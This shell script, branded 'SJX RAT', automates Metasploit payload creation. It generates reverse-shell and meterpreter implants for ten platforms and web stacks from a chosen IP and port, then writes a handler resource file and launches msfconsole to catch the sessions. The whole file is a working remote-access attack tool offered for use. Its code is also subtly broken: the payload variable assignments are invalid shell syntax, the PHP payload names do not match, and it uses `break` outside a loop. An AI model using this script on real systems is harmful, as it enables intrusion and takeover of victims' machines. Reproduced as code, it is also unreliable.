#!/bin/sh
echo "=========================="
echo "=    code by Shaco JX    ="
echo "=        SJX RAT         ="
echo "=   fast creat payload   ="
echo "=       metasploit       ="
echo "=========================="
echo "-----------------"
echo "|  Menu Creater |"
echo "|   [1] Linux   |"
echo "|   [2] Windows |"
echo "|   [3] Mac     |"
echo "|   [4] PHP     |"
echo "|   [5] ASP     |"
echo "|   [6] JSP     |"
echo "|   [7] WAR     |"
echo "|   [8] Python  |"
echo "|   [9] Bash    |"
echo "|   [10] Perl   |"
echo "-----------------"
echo "Enter you choice:"
read choice
echo "Enter ip:"
read ip
echo "Enter port:"
read port
echo "Enter path to save payload:(Ex: /root/Desktop)"
read path
case $choice in
    1)
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $path/shell.elf
        payload = "linux/x86/meterpreter/reverse_tcp"
        break
        ;;
    2)
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $path/shell.exe
        payload = "windows/meterpreter/reverse_tcp"
        break
        ;;
    3)
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $path/shell.macho
        payload = "osx/x86/shell_reverse_tcp"
        break
        ;;
    4)
        msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw > $path/shell.php
        payload = "php/meterpreter_reverse_tcp"
        break
        ;;
    5)
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $path/shell.asp
        payload = "windows/meterpreter/reverse_tcp"
        break
        ;;
    6)
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $path/shell.jsp
        payload = "java/jsp_shell_reverse_tcp"
        break
        ;;
    7)
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $path/shell.war
        payload = "java/jsp_shell_reverse_tcp"
        break
        ;;
    8)
        msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $path/shell.py
        payload = "cmd/unix/reverse_python"
        break
        ;;
    9)
        msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $path/shell.sh
        payload = "cmd/unix/reverse_bash"
        break
        ;;
    10)
        msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > $path/shell.pl
        payload = "cmd/unix/reverse_perl"
        break
        ;;
    *)
        echo "Sorry! Please enter and run again!!!"
        break
        exit
        ;;
esac
echo "Creat payload successfully!"
echo "Creating Listen!"
touch $path/meterpreter.rc
echo use exploit/multi/handler >> $path/meterpreter.rc
echo set PAYLOAD $payload >> $path/meterpreter.rc
echo set LHOST $ip >> $path/meterpreter.rc
echo set LPORT $port >> $path/meterpreter.rc
echo set ExitOnSession false >> $path/meterpreter.rc
echo exploit -j -z >> $path/meterpreter.rc
echo "Listening...."
msfconsole -r $path/meterpreter.rc
